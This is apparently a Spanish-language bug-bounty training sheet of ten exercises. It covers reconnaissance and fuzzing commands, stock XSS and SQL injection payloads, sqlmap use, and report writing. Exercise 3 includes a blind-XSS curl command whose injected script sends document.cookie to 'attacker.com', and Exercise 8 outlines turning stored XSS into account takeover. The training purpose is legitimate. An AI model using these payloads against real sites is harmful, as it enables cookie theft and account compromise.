# Red Team - Fase 7: Bug Bounty Ejercicios

## Ejercicio 1: Reconnaissance

### Objetivo
Enumerar objetivo.

### Pasos
```bash
# Subdomains
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com

# Ports
nmap -p- -iL subs.txt -oN ports.txt

# Technologies
whatweb -iL subs.txt

# Screenshots
gowitness report single target.com
```

### Entregable
Reporte de recon.

---

## Ejercicio 2: Content Discovery

### Objetivo
Encontrar endpoints.

### Pasos
```bash
# Fuzzing básico
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403

# Parameters
ffuf -w params.txt -u https://target.com/?FUZZ=test -mw 100

# Wayback
waybackurls target.com | sort -u
```

### Entregable
Endpoints encontrados.

---

## Ejercicio 3: XSS Finding

### Objetivo
Encontrar XSS.

### Pasos
```bash
# Payload testing
"><script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>

# Blind XSS
curl -X POST -d "q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>" target.com/search
```

### Entregable
XSS encontrado.

---

## Ejercicio 4: SQL Injection

### Objetivo
Encontrar SQLi.

### Pasos
```bash
# Error-based
'

# Boolean-based
' OR 1=1--

# Time-based
' AND SLEEP(5)--

# Con sqlmap
sqlmap -u target.com/vuln.php?id=1 --dbs
```

### Entregable
SQLi exploitado.

---

## Ejercicio 5: Bug Report

### Objetivo
Crear reporte profesional.

### Pasos
1. Title descriptivo
2. Steps to reproduce
3. Impact claro
4. Evidencia
5. Remediation sugerida

### Entregable
Reporte listo.

---

## Ejercicio 6: First Real Bounty

### Objetivo
Submitir en programa real.

### Pasos
1. Register en plataforma
2. Seleccionar programa
3. Buscar vulnerabilidades
4. Preparar reporte
5. Submitir

### Entregable
Reporte submitido.

---

## Ejercicio 7: Full Recon Report

### Objetivo
Reporte de recon completo.

### Pasos
1. Subdomain enumeration
2. Port scan
3. Technology identification
4. Content discovery
5. Documentar

### Entregable
Reporte completo.

---

## Ejercicio 8: Escalation Path

### Objetivo
Escalar vuln encontrada.

### Pasos
1. Encontrar XSS stored
2. Identificar session cookie
3. Escalar a account takeover
4. Documentar impacto

### Entregable
Vuln escalada.

---

## Ejercicio 9: Private Program

### Objetivo
Apply a private program.

### Pasos
1. Construir perfil
2. Apply
3. Wait for approval
4. Hunt
5. Report

### Entregable
Acceso a private.

---

## Ejercicio 10: Professional Pathfinder

### Objetivo
Get paid for bugs.

### Pasos
1. Mejorar habilidades
2. Network with researchers
3. Apply to programs
4. Deliver quality reports
5. Build reputation

### Entregable
Primer pago.